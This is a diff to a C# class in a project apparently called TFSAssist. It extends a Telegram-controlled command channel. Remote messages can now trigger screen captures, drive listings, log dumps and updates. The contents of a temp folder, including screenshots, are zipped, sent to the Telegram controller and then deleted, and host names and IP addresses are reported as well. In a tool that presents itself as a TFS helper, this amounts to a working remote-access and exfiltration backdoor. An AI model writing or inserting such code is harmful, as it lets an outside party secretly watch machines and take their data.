@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Text;
@@ -29,12 +30,17 @@ namespace TFSAssist
     {
         public string TempDirectory { get; }
         private string ClientID = string.Empty;
-        private Action<WarnSeverity, string> _log;
         private TTLControl _control;
 
-        public TFSA_TLControl(string clientId, Action<WarnSeverity, string> log)
+        private Func<bool> _checkUpdates;
+        private Func<string> _getLogs;
+        private Action<WarnSeverity, string> _writeLog;
+
+        public TFSA_TLControl(string clientId, Func<bool> checkUpdates, Func<string> getLogs, Action<WarnSeverity, string> log)
         {
-            _log = log;
+            _checkUpdates = checkUpdates;
+            _getLogs = getLogs;
+            _writeLog = log;
             ClientID = clientId;
             TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
         }
@@ -51,20 +57,20 @@ namespace TFSAssist
 
                 await Task.Delay(5000);
 
-                await _control.SendMessageAsync(_control.CurrentUser.Destination, $"Connected. {GetCurrentServerInfo()}", 0);
+                await SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");
 
                 return true;
             }
             catch (Exception ex)
             {
-                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
+                WriteLog(ex, false);
                 return false;
             }
         }
 
         public async Task EndTransaction()
         {
-            await _control.SendMessageAsync(_control.CurrentUser.Destination, $"Disconnected. {GetCurrentServerInfo()}", 0);
+            await SendMessageToCurrentUser($"Disconnected. {GetCurrentServerInfo()}");
         }
 
         public async Task Run()
@@ -84,7 +90,7 @@ namespace TFSAssist
                 }
                 catch (Exception ex)
                 {
-                    _log?.Invoke(WarnSeverity.Debug, GetExMessage(ex));
+                    WriteLog(ex);
                 }
 
                 await Task.Delay(5000);
@@ -93,40 +99,134 @@ namespace TFSAssist
 
         async Task ReadCommands(List<TLMessage> newMessages)
         {
+            bool isUpdate = false;
+            string isCommand = ClientID + ":";
+
             try
             {
                 foreach (var tlMessage in newMessages)
                 {
-                    string isCommand = ClientID + ":";
                     if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                     {
-                        string message = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
+                        string message = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length).ToLower();
                         switch (message)
                         {
                             case "screen":
-                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.jpg");
-                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Jpeg);
-                                await _control.SendPhotoAsync(_control.CurrentUser.Destination, imagePath);
-                                //File.Delete(imagePath);
+                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.png");
+                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                 break;
+
                             case "info":
-                                await _control.SendMessageAsync(_control.CurrentUser.Destination, GetCurrentServerInfo(true), 0);
+                                await SendMessageToCurrentUser(GetCurrentServerInfo(true));
                                 break;
+
+                            case "drive":
+                                var drives = System.IO.DriveInfo.GetDrives();
+                                if (drives == null)
+                                    break;
+                                string result = string.Empty;
+                                foreach (var drive in drives)
+                                {
+                                    long freeSpaces = IO.GetTotalFreeSpace(drive.Name);
+                                    string freeSize = IO.FormatBytes(freeSpaces, out var newBytes);
+                                    result += $"Drive=[{drive.Name}] FreeSize={freeSize}\r\n";
+                                }
+                                await SendMessageToCurrentUser(result.Trim());
+                                break;
+
+                            case "log":
+                                string logs = _getLogs?.Invoke();
+                                if (logs.IsNullOrEmptyTrim())
+                                    break;
+
+                                using (var stream = new FileStream(Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.log"), FileMode.OpenOrCreate))
+                                {
+                                    byte[] logsBytes = new UTF8Encoding(true).GetBytes(logs);
+                                    await stream.WriteAsync(logsBytes, 0, logsBytes.Length);
+                                }
+
+                                break;
+
+                            case "update":
+                                isUpdate = true;
+                                break;
+
                         }
                     }
                     else if (tlMessage.Message.Like("info"))
                     {
-                        await _control.SendMessageAsync(_control.CurrentUser.Destination, GetCurrentServerInfo(), 0);
+                        await SendMessageToCurrentUser(GetCurrentServerInfo());
+                    }
+                    else if (tlMessage.Message.Like("update"))
+                    {
+                        isUpdate = true;
                     }
                 }
             }
             catch (Exception ex)
             {
-                _log?.Invoke(WarnSeverity.Debug, GetExMessage(ex));
+                WriteLog(ex);
             }
             finally
             {
-                // delete all data in temp
+                var tempFiles = Directory.EnumerateFiles(TempDirectory);
+                if (tempFiles.Count() > 0)
+                {
+                    try
+                    {
+                        string destinationZip = DoZipFile(TempDirectory);
+                        if (destinationZip != null && File.Exists(destinationZip))
+                        {
+                            await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationZip);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        WriteLog(ex);
+                    }
+
+                    try
+                    {
+                        foreach (var fileName in tempFiles)
+                        {
+                            var fileInfo = new FileInfo(fileName);
+                            fileInfo.Attributes = FileAttributes.Normal;
+                            fileInfo.Delete();
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        WriteLog(ex);
+                    }
+                }
+
+                if (isUpdate)
+                {
+                    _checkUpdates?.BeginInvoke(null, null);
+                }
+            }
+        }
+
+        async Task SendMessageToCurrentUser(string message)
+        {
+            await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message}", 0);
+        }
+
+        string DoZipFile(string sourceDir)
+        {
+            try
+            {
+                string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
+                string packFileTempPath = Path.GetTempFileName();
+                File.Delete(packFileTempPath);
+                ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);
+                File.Copy(packFileTempPath, destinationZip, true);
+                File.Delete(packFileTempPath);
+                return destinationZip;
+            }
+            catch (Exception)
+            {
+                return null;
             }
         }
 
@@ -140,10 +240,10 @@ namespace TFSAssist
                 {
                     var serverName = System.Environment.MachineName;
                     var full = System.Net.Dns.GetHostEntry(serverName).HostName;
-                    return $"CID=[{ClientID}] Host=[{hostName}] FullName=[{full}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
+                    return $"Host=[{hostName}] FullName=[{full}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
                 }
 
-                return $"CID=[{ClientID}] Host=[{hostName}]";
+                return $"Host=[{hostName}]";
             }
             catch (Exception)
             {
@@ -172,7 +272,7 @@ namespace TFSAssist
             }
             catch (Exception ex)
             {
-                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
+                WriteLog(ex);
             }
         }
 
@@ -186,7 +286,7 @@ namespace TFSAssist
                 }
                 catch (Exception ex)
                 {
-                    _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
+                    WriteLog(ex, false);
                 }
             }
 
@@ -199,16 +299,16 @@ namespace TFSAssist
             }
             catch (Exception ex)
             {
-                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
+                WriteLog(ex, false);
                 tryes++;
                 if (tryes < 5)
                     goto lableTrys;
             }
         }
 
-        string GetExMessage(Exception ex)
+        void WriteLog(Exception ex, bool isDebug = true)
         {
-            return $"{nameof(TFSA_TLControl)} - {ex.Message}";
+            _writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)} - {ex.Message}");
         }
     }
 }
